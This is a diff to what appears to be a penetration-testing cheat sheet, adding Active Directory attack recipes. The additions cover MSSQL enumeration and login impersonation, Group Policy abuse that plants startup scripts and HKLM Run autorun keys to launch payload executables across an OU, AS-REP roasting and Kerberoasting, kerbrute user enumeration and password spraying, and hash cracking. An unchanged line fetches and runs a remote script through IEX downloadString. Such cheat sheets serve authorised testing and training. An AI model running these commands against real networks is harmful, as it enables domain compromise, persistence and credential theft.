@@ -224,6 +224,7 @@
 | Redis RCE | https://github.com/Ridter/redis-rce |
 | Redis Rogue Server | https://github.com/n0b0dyCN/redis-rogue-server |
 | SQL Injection Cheatsheet | https://tib3rius.com/sqli.html |
+| MSSQL Recon | https://github.com/skahwah/SQLRecon |
 
 ### Password Attacks
 
@@ -3612,6 +3613,7 @@ impacket-mssqlclient <USERNAME>@<RHOST>
 impacket-mssqlclient <USERNAME>@<RHOST> -windows-auth
 impacket-mssqlclient -k -no-pass <RHOST>
 impacket-mssqlclient <RHOST>/<USERNAME>:<USERNAME>@<RHOST> -windows-auth
+mssqlclient.py -windows-auth <SYSTEM_USER>@<IP> //with password
 ```
 
 ```c
@@ -3672,6 +3674,68 @@ mssqlclient.py  -db volume -windows-auth <DOMAIN>/<USERNAME>:<PASSWORD>@<IP>
 
 ```c
 sqsh -S <IP> -U <Username> -P <Password> -D <Database>
+```
+
+###### Enumeartion of MSSQL
+
+
+Get Instance
+
+```c
+powershell-import C:\Tools\PowerUpSQL\PowerUpSQL.ps1
+powershell Get-SQLInstanceDomain
+powershell Get-SQLInstanceDomain | Get-SQLConnectionTest | ? { $_.Status -eq "Accessible" } | Get-SQLServerInfo // If multiple
+.\SQLRecon.exe /enum:sqlspns
+```
+
+Check if connection is possible
+
+```c
+powershell Get-SQLConnectionTest -Instance "<INSTANCE>" | fl
+```
+
+```c
+.\SQLRecon.exe /auth:wintoken /host:<ComputerName> /module:info
+```
+
+Show roles of users
+
+```c
+.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:whoami
+```
+
+Find user or groups that have access
+
+```c
+powershell Get-DomainGroup -Identity *SQL* | % { Get-DomainGroupMember -Identity $_.distinguishedname | select groupname, membername }
+```
+
+With credentials
+
+```c
+.\SQLRecon.exe /a:windomain /d:<DOMAIN> /u:<mssql_svc> /p:<PASSWORD> /h:<INSTANCE> /m:whoami
+```
+
+Queries
+
+```c
+powershell Get-SQLQuery -Instance "<INSTANCE>" -Query "select @@servername"
+.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:query /c:"select @@servername"
+```
+
+Impersonate
+
+```c
+.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:impersonate
+
+SELECT * FROM sys.server_permissions WHERE permission_name = 'IMPERSONATE';
+SELECT name, principal_id, type_desc, is_disabled FROM sys.server_principals;
+```
+
+Run impersonation
+
+```c
+.\SQLRecon.exe /a:wintoken /h:<INSTANCE> /m:iwhoami /i:<SYSTEM_USER>
 ```
 
 ##### Common Commands
@@ -4265,6 +4329,104 @@ fcrackzip -u -D -p /PATH/TO/WORDLIST/<WORDLIST> <FILE>.zip
 ```c
 python3 gpp-decrypt.py -f Groups.xml
 python3 gpp-decrypt.py -c edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+```
+
+#### Modify Existing Group Policy
+
+Search for CreateChild, WriteProperty or GenericWrite. Obtain the ObjectDN
+
+```c
+powershell Get-DomainGPO | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ActiveDirectoryRights -match "CreateChild|WriteProperty" -and $_.SecurityIdentifier -match "S-1-5-21-569305411-121244042-2357301523-[\d]{4,10}" } 
+```
+
+Obtain the group by the SecurityIdentifier
+
+```c
+powershell ConvertFrom-SID <SecurityIdentifier>
+```
+
+```c
+powershell Get-DomainGPO -Identity "<ObjectDN>" | select displayName, gpcFileSysPath
+```
+
+Now optain the distinguishedname or OU (OU=Workstations,DC=dev,DC=cyberbotic,DC=io)                          
+
+```c
+powershell Get-DomainOU -GPLink "{5059FAC1-5E94-4361-95D3-3BB235A23928}" | select distinguishedName
+```
+
+Get the computers affected (computers in an OU) 
+
+```c
+powershell Get-DomainComputer -SearchBase "<distinguishedname_or_OU>" | select dnsHostName
+```
+
+modify the associated files directly in SYSVOL (the gpcFileSysPath)
+
+```c
+ ls \\dev.cyberbotic.io\SysVol\dev.cyberbotic.io\Policies\{<ObjectDN>}
+```
+
+Find this software share using PowerView
+
+```c
+Find-DomainShare -CheckShareAccess
+```
+
+Put a startup script in SYSVOL that will be executed each time an effected computer starts 
+
+```c
+.\SharpGPOAbuse.exe --AddComputerScript --ScriptName startup.bat --ScriptContents "start /b \\dc-2\<SOFTWARE_SHARE>\<PAYLOAD>.exe" --GPOName "Vulnerable GPO"
+```
+
+Access the affected computer on cmd
+
+```c
+gpupdate /force  // and then restart the pc
+```
+
+##### Create & Link a GPO
+
+With powerview get groups affected
+
+```c
+powershell Get-DomainObjectAcl -Identity "<CN=Policies,CN=System,DC=dev,DC=cyberbotic,DC=io>" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" -and $_.ActiveDirectoryRights -contains "CreateChild" } | % { ConvertFrom-SID $_.SecurityIdentifier }
+```
+
+Find link a GPO to an OU
+
+```c
+powershell Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN,ActiveDirectoryRights,ObjectAceType,SecurityIdentifier | fl
+```
+
+Obtain the group by the SecurityIdentifier
+
+```c
+powershell ConvertFrom-SID <SecurityIdentifier>
+```
+
+Check if PowerShell RSAT modules are installed
+
+```c
+powershell Get-Module -List -Name GroupPolicy | select -expand ExportedCommands
+```
+
+Use the New-GPO cmdlet to create and link a new GPO.
+
+```c
+powershell New-GPO -Name "Evil GPO"
+```
+
+Add an HKLM autorun key to the registry
+
+```c
+powershell Set-GPPrefRegistryValue -Name "Evil GPO" -Context Computer -Action Create -Key "HKLM\Software\Microsoft\Windows\CurrentVersion\Run" -ValueName "Updater" -Value "C:\Windows\System32\cmd.exe /c \\dc-2\software\<PAYLOAD>.exe" -Type ExpandString
+```
+
+Apply the GPO to the target OU.
+
+```c
+powershell Get-GPO -Name "Evil GPO" | New-GPLink -Target "OU=Workstations,DC=dev,DC=cyberbotic,DC=io"
 ```
 
 #### hashcat
@@ -5408,6 +5570,17 @@ hashcat -m 18200 hashes.asreproast /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/ha
 ```
 
 ```c
+for user in $(cat users); do python3 GetNPUsers.py -no-pass -dc-ip IP DOMAIN/$<USERNAME> | grep -v Impacket; done
+python3 GetNPUsers.py DOMAIN/ -usersfile USERFILE
+```
+
+With credentials
+
+```c
+GetUserSPNs.py Domain/USER:PASS@IP -dc-ip IP 2>/dev/null
+```
+
+```c
 .\Rubeus.exe asreproast /nowrap
 .\Rubeus.exe asreproast /user:<USERNAME> /nowrap
 hashcat -m 18200 hashes.asreproast2 /PATH/TO/WORDLIST/<WORDLIST> -r /usr/share/hashcat/rules/best64.rule --force
@@ -6373,6 +6546,14 @@ IEX(New-Object Net.webclient).downloadString('http://<LHOST>:<LPORT>/jaws-enum.p
 
 ```c
 ./kerbrute -domain <DOMAIN> -users <FILE> -passwords <FILE> -outputfile <FILE>
+./kerbrute userenum --dc <DC_IP> -d DOMAIN /opt/SecLists/Usernames/top-usernames-shortlist.txt
+```
+
+Crack
+
+```c
+cat has_nrm | sed 's/^ *//' | tr -d '\n' // hash treatement
+john --format:krb5asrep hash --wordlist=/usr/share/wordlists/rockyou.txt
 ```
 
 ###### With List of Users
